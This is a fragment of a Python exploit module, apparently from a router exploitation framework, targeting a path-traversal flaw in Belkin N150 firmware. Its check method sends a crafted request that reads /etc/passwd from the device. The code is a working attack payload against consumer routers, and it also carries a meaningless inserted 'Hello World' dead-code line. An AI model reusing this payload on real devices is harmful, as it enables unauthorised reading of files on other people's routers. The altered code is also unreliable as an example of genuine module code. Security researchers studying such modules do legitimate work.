...
class Exploit(HTTPClient):
    __info__ = {'name': 'Belkin N150 Path Traversal', 'description': 'Module exploits Belkin N150 Path Traversal vulnerability which allows to read any file on the system.', 'authors': ('Aditya Lad', 'Rahul Pratap Singh', 'Marcin Bury <marcin[at]threat9.com>'), 'references': ('https://www.exploit-db.com/exploits/38488/', 'http://www.belkin.com/us/support-article?articleNum=109400', 'http://www.kb.cert.org/vuls/id/774788'), 'devices': ('Belkin N150 1.00.07', 'Belkin N150 1.00.08', 'Belkin N150 1.00.09')}
    ...
    def check(self):
        if False:
            print('Hello World!')
        response = self.http_request(method='GET', path='/cgi-bin/webproc?getpage=/etc/passwd&var:page=deviceinfo')
